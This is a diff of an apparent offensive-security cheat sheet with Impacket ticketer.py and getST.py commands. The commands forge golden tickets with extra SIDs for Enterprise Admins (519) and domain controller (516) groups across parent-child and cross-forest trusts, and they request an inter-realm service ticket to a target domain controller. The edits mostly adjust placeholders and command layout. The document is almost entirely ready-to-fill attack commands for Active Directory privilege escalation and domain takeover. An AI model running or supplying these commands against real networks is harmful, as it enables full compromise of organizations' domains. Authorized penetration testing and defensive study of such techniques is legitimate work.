@@ -18,25 +18,24 @@ ticketer.py -nthash <krbtgt_hash> -domain <domain_fqdn> -domain-sid <domain_sid>
 ## golden + ExtraSID (parent-child)
 if user = administrator no need of -user-id
 ```bash
-ticketer.py -nthash <src_krbtgt_nthash>  -domain-sid <src_domain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<rid|519> -user-id <user_rid> <user|jubeaz>
+ticketer.py -nthash <src_krbtgt_nthash>  -domain-sid <src_domain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<rid|519> -user-id <src_domain_user_rid> <user|jubeaz>
 ```
 
 ## golden + ExtraSID (parent-child) (dc account)
 ```bash
-ticketer.py -nthash <src_krbtgt_nthash> -domain-sid <src_domain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<rid|516> -user-id <dc_rid>  '<dc_name>$'
+ticketer.py -nthash <src_krbtgt_nthash> -domain-sid <src_domain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<rid|516> -user-id <src_domain_user_rid>  '<dc_name>$'
 ```
 
 ## golden + ExtraSID (cross-forest)
 if user = administrator no need of -user-id
 ```bash
-ticketer.py -nthash <src_krbtgt_nthash>  -domain-sid <src_domain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<rid> -user-id <user_rid> <user>
+ticketer.py -nthash <src_krbtgt_nthash>  -domain-sid <src_domain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<rid> -user-id <src_domain_user_rid> <user>
 ```
 
 ## golden Inter-Realm TGT (referal)
-    export KRB5CCNAME=/tmp/jubeaz.ccache   
-    getST.py -k -no-pass -spn <cifs>/<dst_dc_fqdn> <dst_domain_fqdn>/<user>@<dst_domain_fqdn> -debug
+KRB5CCNAME=/tmp/jubeaz.ccache getST.py -k -no-pass -spn <cifs>/<dst_dc_fqdn> <dst_domain_fqdn>/<user>@<dst_dc_fqdn> -debug
 ```bash
-ticketer.py -nthash <src_trust_nthash> -domain-sid <src_domain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<RID|519>" -spn "krbtgt/<dst_domain_fqdn>" -user-id <user_rid> <user|jubeaz>
+ticketer.py -nthash <src_trust_nthash> -domain-sid <src_domain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<RID|519>" -spn "krbtgt/<dst_domain_fqdn>" -user-id <src_domain_user_rid> <user|jubeaz>
 ```
 
 ## silver ticket
